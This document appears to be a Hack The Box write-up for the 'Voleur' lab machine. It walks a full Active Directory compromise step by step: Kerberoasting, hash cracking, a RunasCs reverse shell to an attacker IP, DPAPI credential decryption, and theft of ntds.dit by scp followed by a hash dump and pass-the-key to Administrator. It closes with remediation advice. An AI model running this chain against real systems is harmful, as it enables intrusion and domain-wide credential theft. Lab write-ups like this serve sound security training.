# Voleur - Hack The Box Writeup

## Initial Access

### Credentials Provided
- **Username:** ryan.naylor
- **Password:** HollowOct31Nyt

These credentials are provided as the initial access point for this Windows-based penetration test, which is a common scenario in real-world engagements.

## Enumeration

### Network Scanning
We begin with basic network reconnaissance to identify open ports and services running on the target system.

#### Initial Port Scanning
```bash
nmap -p- -sS -vvv 10.10.11.76
```

#### DNS and Host Discovery
Attempting to discover domain information and update local hosts file:
```bash
nxc smb 10.10.11.76 | grep "domain:" | sed 's/.*(name:\([^)]*\)).*(domain:\([^)]*\)).*/\1 \2/' | while read NAME DOMAIN; echo "10.10.11.76    $NAME $NAME.$DOMAIN $DOMAIN"; end | sudo tee -a /etc/hosts (failed)

nxc ldap 10.10.11.76 -u 'ryan.naylor' -p 'HollowOct31Nyt' --bloodhound --collection All --dns-server 10.10.11.76 (failed)
```

### BloodHound Data Collection
Attempting to collect Active Directory information using BloodHound:
```bash
bloodhound-ce-python -d voleur.htb -u ryan.naylor -k --dc DC.voleur.htb --zip -c All
```

### Kerberos Authentication
We authenticate using Kerberos to obtain a Ticket Granting Ticket (TGT):
```bash
getTGT.py voleur.htb/ryan.naylor:'HollowOct31Nyt'
export KRB5CCNAME=ryan.naylor.ccache
```

### BloodHound Enumeration
We use BloodHound to map the Active Directory environment and identify potential attack paths:
```bash
bloodhound-ce-python -d voleur.htb -u ryan.naylor -k --dc DC.voleur.htb --zip -c All
```

### SMB Access
With valid Kerberos credentials, we can access the SMB shares using the following command:
```bash
smbclient.py -k voleur.htb/ryan.naylor@DC.voleur.htb
```

### SMB Share Analysis
After gaining access to the SMB share, we discover a critical file named "Access_Review.xlsx" containing the following user information:

| User | Job Title | Permissions | Notes |
| --- | --- | --- | --- |
| Ryan.Naylor | First-Line Support Technician | SMB | Has Kerberos Pre-Auth disabled temporarily to test legacy systems. |
| Marie.Bryant | First-Line Support Technician | SMB |  |
| Lacey.Miller | Second-Line Support Technician | Remote Management Users |  |
| Todd.Wolfe | Second-Line Support Technician | Remote Management Users | Leaver. Password was reset to NightT1meP1dg3on14 and account deleted. |
| Jeremy.Combs | Third-Line Support Technician | Remote Management Users. | Has access to Software folder. |
| Administrator | Administrator | Domain Admin | Not to be used for daily tasks! |
|  |  |  |  |
| **Service Accounts** |  |  |  |
| svc_backup |  | Windows Backup | Speak to Jeremy! |
| svc_ldap |  | LDAP Services | P/W - M1XyC9pW7qT5Vn |
| svc_iis |  | IIS Administration | P/W - N5pXyW1VqM7CZ8 |
| svc_winrm |  | Remote Management  | Need to ask Lacey as she reset this recently. |

### Service Account Enumeration
Using the discovered credentials, we obtain TGTs for the service accounts:
```bash
getTGT.py voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn'
getTGT.py voleur.htb/svc_iis:'N5pXyW1VqM7CZ8'
```

### Privilege Escalation Path
BloodHound analysis reveals that `svc_ldap` has `WriteSPN` permissions on `svc_winrm`. This is a potential privilege escalation vector, as it allows us to perform a targeted Kerberoasting attack against the `svc_winrm` account.

```bash
export KRB5CCNAME=svc_ldap.ccache
python /home/user/hacktools/targetedKerberoast/targetedKerberoast.py -k -u 'svc_ldap' --dc-host dc.voleur.htb -d voleur.htb
```
### Cracking the Hash
We save the obtained hash to `hashes.txt` and attempt to crack it using John the Ripper with the rockyou wordlist:
```bash
/home/user/john/run/john --wordlist=/home/user/wordlists/rockyou.txt /home/user/htb/voleur/hashes.txt
```

**Result:** Successfully cracked the hash for `svc_winrm`:
- **Password:** `AFireInsidedeOzarctica980219afi`

### Obtaining TGT for svc_winrm
Now that we have the password for `svc_winrm`, we can obtain a TGT for this user.
```bash
getTGT.py voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi'
export KRB5CCNAME=svc_winrm.ccache
```

### Establishing Initial Foothold
With valid credentials, we establish a remote shell using Evil-WinRM:
```bash
evil-winrm-py -i 10.10.11.76 -u svc_winrm -p 'AFireInsidedeOzarctica980219afi' -k --no-pass --spn-hostname dc.voleur.htb 
```

### Establishing Shell Access
Since direct WinRM login isn't possible with the LDAP service account, we use RunasCs to get a reverse shell:

1. First, upload the RunasCs utility:
```powershell
uploasd /home/user/htb/voleur/RunasCs.exe .
```

2. Execute RunasCs to get a reverse shell:
```powershell
.\RunasCs.exe svc_ldap 'M1XyC9pW7qT5Vn' powershell.exe -r 10.10.16.79:6666
```

3. Set up a Netcat listener to catch the reverse shell:
```bash
nc -lvnp 6666
```

### Recovering Deleted User Account
We search for deleted user accounts, focusing on Todd Wolfe whose credentials were previously discovered:

1. Enumerate all AD objects, including deleted ones:
```powershell
Get-ADObject -Filter 'objectClass -eq "user"' -IncludeDeletedObjects
```

2. We locate the deleted Todd Wolfe account:
```
Deleted           : 
DistinguishedName : CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
Name              : Todd Wolfe
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

3. Restore the deleted account using its ObjectGUID:
```powershell
Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
```

4. Verify the account is restored:
```powershell
net user /domain
```

**Output:**
```
User accounts for \\DC
-------------------------------------------------------------------------------
Administrator            krbtgt                   svc_ldap                 
todd.wolfe
```

The account has been successfully restored.


### Obtaining TGT for Restored User
With Todd Wolfe's account restored and password known, we can obtain a TGT for this user.
```bash
getTGT.py voleur.htb/todd.wolfe:'NightT1meP1dg3on14'
export KRB5CCNAME=todd.wolfe.ccache
```

### BloodHound Scan as Todd Wolfe
To understand the permissions of the newly restored user, we perform another BloodHound scan.
```bash
bloodhound-ce-python -d voleur.htb -u todd.wolfe -k -dc DC.voleur.htb --zip -c All
```

### Exploring SMB Shares as Todd Wolfe
We explore the available SMB shares with Todd Wolfe's credentials.
```bash
smbclient.py -k voleur.htb/todd.wolfe@DC.voleur.htb
```

Navigating the SMB shares as Todd Wolfe, we find an archived home directory (`/IT/Second-Line Support/Archived Users/todd.wolfe/`) which appears to be a full backup of the user's profile. This is a promising location for finding sensitive files, including DPAPI-protected data.

```smbclient
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 06:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 17:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 06:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:16 2025 todd.wolfe
# cd todd.wolfe
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 11:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 12:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 09:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 09:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 09:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Videos
# cd AppData
# cd Roaming
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Adobe
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Microsoft
# cd Microsoft
c# ls
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Credentials
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Crypto
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Internet Explorer
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Network
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Protect
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Spelling
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 SystemCertificates
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Vault
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Windows
# cd Protect
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 ..
-rw-rw-rw-         24  Wed Jan 29 09:53:08 2025 CREDHIST
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 S-1-5-21-3927696377-1337352550-2781715495-1110
-rw-rw-rw-         76  Wed Jan 29 09:53:08 2025 SYNCHIST
# cd S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 10:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 09:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 09:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
# cd ..
# cd ..
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Credentials
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Crypto
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Internet Explorer
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Network
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Protect
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Spelling
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 SystemCertificates
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Vault
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Windows
# cd Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 10:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
# exit
```


### DPAPI Fundamentals

DPAPI (Data Protection API) is a Windows mechanism for symmetrically encrypting data. The keys used for encryption are themselves protected, typically derived from the user's login credentials.

-   **User Master Keys**: Located at `%APPDATA%\Microsoft\Protect\{SID}`, where `{SID}` is the user's Security Identifier. These keys protect user-specific data.
-   **User Credentials**: DPAPI-encrypted data, like saved passwords, are stored in various locations, such as `C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\`.
-   **System Master Keys**: For system-level secrets, keys are stored in `C:\Windows\System32\Microsoft\Protect\S-1-5-18\User`.


### Extracting Master Key
Using the recovered credentials and SID, we extract the DPAPI master key:
```bash
dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
```

we got:


[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

### Decrypting Credentials with Master Key
With the master key, we can now decrypt the credential file we downloaded earlier.
```bash
dpapi.py decrypt -file 772275FAD58525253490A9B0039791D3 -masterkey 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```
### Decrypting Credentials
Successfully decrypted credentials using the extracted master key: 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m

The decrypted credentials belong to `jeremy.combs` (`qT3V9pLXyN7W4m`), a member of the "Third-Line Support" group. We will now pivot to this user to continue our enumeration.

```bash
getTGT.py voleur.htb/jeremy.combs:'qT3V9pLXyN7W4m'
export KRB5CCNAME=jeremy.combs.ccache
```

### BloodHound Scan as Jeremy Combs
We perform another BloodHound scan to map out permissions for `jeremy.combs`.
```bash
bloodhound-ce-python -d voleur.htb -u jeremy.combs -k -dc DC.voleur.htb --zip -c All
```

### Exploring SMB Shares with Jeremy's Credentials
```bash
smbclient.py -k voleur.htb/jeremy.combs@DC.voleur.htb
```

### File Discovery on IT Share
As `jeremy.combs`, we have access to the `Third-Line Support` directory within the `IT` share. We find an SSH private key (`id_rsa`) and a note.

```smbclient
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 06:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 17:09:59 2025 ..
drw-rw-rw-          0  Thu Jan 30 13:11:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 13:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 06:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 13:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 13:07:35 2025 Note.txt.txt
# get ida_rsa
[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
# ls
drw-rw-rw-          0  Thu Jan 30 13:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 06:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 13:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 13:07:35 2025 Note.txt.txt
# get id_rsa
# get Note.txt.txt
# exit
```

### Analyzing Discovered Notes
The note.txt file contains the following information: 

Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin⏎

The note suggests that WSL (Windows Subsystem for Linux) has been configured, and the presence of an `id_rsa` key points towards a potential SSH entry point. We perform a port scan to confirm this.
```bash
nmap -Pn 10.10.11.76
```
**Scan Results:**
```
Nmap scan report for DC (10.10.11.76)
Host is up (0.17s latency).
Not shown: 991 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
636/tcp  open  ldapssl
2222/tcp open  EtherNetIP-1
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

### Discovering SSH Service
We identify an open SSH service on port 2222 and attempt to connect using the discovered private key:
```bash
ssh -i id_rsa -p 2222 svc_backup@10.10.11.76
```

### Critical Files Discovery
While exploring the filesystem, we discover critical Active Directory backup files:

svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd Active\ Directory/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls
ntds.dit  ntds.jfm
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls
SAM  SECURITY  SYSTEM
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ exit
logout
Connection to 10.10.11.76 closed.

### Downloading Critical Files
We use `scp` to download the Active Directory database (`ntds.dit`) and the required registry hives (`SECURITY`, `SYSTEM`) from the remote machine.
```bash
scp -i id_rsa -P 2222 svc_backup@10.10.11.76:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/ntds.dit .
scp -i id_rsa -P 2222 svc_backup@10.10.11.76:/mnt/c/IT/Third-Line\ Support/Backups/registry/SECURITY .
scp -i id_rsa -P 2222 svc_backup@10.10.11.76:/mnt/c/IT/Third-Line\ Support/Backups/registry/SYSTEM .
```

### Dumping Hashes from NTDS.dit
With access to the `ntds.dit` file and the `SYSTEM` registry hive, we can extract all the NTLM hashes for the domain.

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY local
```

**Output Hash Dump:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab

### Domain Compromise

#### Pass-the-Hash with Administrator Account
Using the extracted AES key for the Administrator account, we can perform a Pass-the-Hash attack to gain privileged access.

1.  **Obtain TGT for Administrator**:
    ```bash
    getTGT.py -aesKey f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb VOLEUR.HTB/Administrator
    export KRB5CCNAME=Administrator.ccache
    ```

2.  **Access Privileged SMB Share**:
    ```bash
    smbclient.py -k //DC/C$ -c 'ls; cat users/administrator/desktop/root.txt'
    ```

now we can get a shell
```bash
evil-winrm-py -i dc.voleur.htb -u Administrator -k --no-pass
```

## Conclusion

This penetration test successfully demonstrated a complete attack chain, starting from initial access with supplied credentials and culminating in full domain compromise. The key vulnerabilities and misconfigurations that enabled this were:

-   **Credential Exposure**: Passwords for service accounts were found in a shared file.
-   **Weak Permissions**: The `svc_ldap` account had `WriteSPN` permissions, allowing for a Kerberoasting attack.
-   **Insecure Account Management**: A deleted user's account was easily restorable, and their home directory containing sensitive DPAPI data was left accessible on a network share.
-   **Insecure Backups**: Critical Active Directory backup files (`ntds.dit`, registry hives) were stored in an accessible location, leading to the compromise of all domain credentials.

### Recommendations

To remediate the identified vulnerabilities and improve the overall security posture, the following actions are recommended:

1.  **Implement Strong Password Policies**: Enforce complexity requirements, regular rotation, and prohibit the sharing of credentials in plaintext files.
2.  **Enforce Principle of Least Privilege**: Regularly audit user and service account permissions. Remove unnecessary privileges, such as the `WriteSPN` permission from the `svc_ldap` account.
3.  **Secure Account Lifecycle Management**: Establish a formal process for de-provisioning user accounts. This should include wiping or archiving user data to a secure, restricted-access location.
4.  **Secure Backups**: Ensure that critical system backups, especially for Active Directory, are encrypted and stored in a location with highly restricted access.
5.  **Monitor for Malicious Activity**: Implement monitoring for unusual activities such as account restoration, DPAPI key access, and large data transfers from sensitive shares.